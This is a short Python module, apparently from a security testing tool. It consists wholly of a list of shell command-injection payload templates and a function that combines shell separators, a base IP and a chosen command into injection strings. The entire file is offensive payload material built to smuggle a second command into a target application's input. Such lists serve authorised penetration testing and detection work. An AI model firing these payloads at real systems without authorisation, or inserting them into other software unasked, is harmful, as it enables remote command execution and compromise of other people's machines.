#!/usr/bin/env python3
# -*- coding: utf-8 -*-

EXTRA_COMMAND_INJECTION_PAYLOADS = [
    ";{cmd};", ";{cmd}", "|{cmd}", "|{cmd}|", "||{cmd}|", "|{cmd};", "||{cmd};",
    ";{cmd}|", ";|{cmd}|", "`{cmd}`",
    "a);{cmd}", "a;{cmd}", "a);{cmd};", "a;{cmd};", "a);{cmd}|", "a;{cmd}|",
    "a)|{cmd}", "a|{cmd}", "a)|{cmd};", "a|{cmd}",
    "|/bin/{cmd}",
    "a);/usr/bin/{cmd}", "a;/usr/bin/{cmd}", "a);/usr/bin/{cmd};", "a;/usr/bin/{cmd};",
    "a);/usr/bin/{cmd}|", "a;/usr/bin/{cmd}|", "a)|/usr/bin/{cmd}", "a|/usr/bin/{cmd}",
    "a)|/usr/bin/{cmd};", "a|/usr/bin/{cmd}",
    "; {cmd}", "| {cmd}", "& {cmd}"
]

def generate_payloads(cmd, base_ip="127.0.0.1"):
    seps = [';', '|', '&', '&&', '||', '`', '$(']
    payloads = []
    for sep in seps:
        p1 = f"{base_ip}{sep}{cmd}"
        if '\n' not in p1 and '\r' not in p1:
            payloads.append(p1)
        p2 = f"{sep}{cmd}"
        if '\n' not in p2 and '\r' not in p2:
            payloads.append(p2)
    for tpl in EXTRA_COMMAND_INJECTION_PAYLOADS:
        payloads.append(tpl.format(cmd=cmd))
    return payloads